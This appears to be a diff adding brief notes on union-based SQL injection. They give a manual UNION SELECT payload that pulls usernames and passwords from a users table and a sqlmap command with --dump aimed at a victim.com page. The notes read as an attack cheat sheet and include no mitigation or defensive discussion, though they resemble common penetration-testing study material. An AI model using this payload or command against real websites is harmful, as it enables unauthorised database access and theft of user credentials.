@@ -1,0 +1,14 @@
+Union-Based SQL Injection
+
+Idea: Inject a UNION SELECT to combine attacker’s query with original query and dump data directly.
+
+Manual Payload Example:
+
+' UNION SELECT null, username, password FROM users--
+
+
+If the columns align correctly, this will return usernames & passwords in the webpage.
+
+sqlmap Command:
+
+sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=U --dump
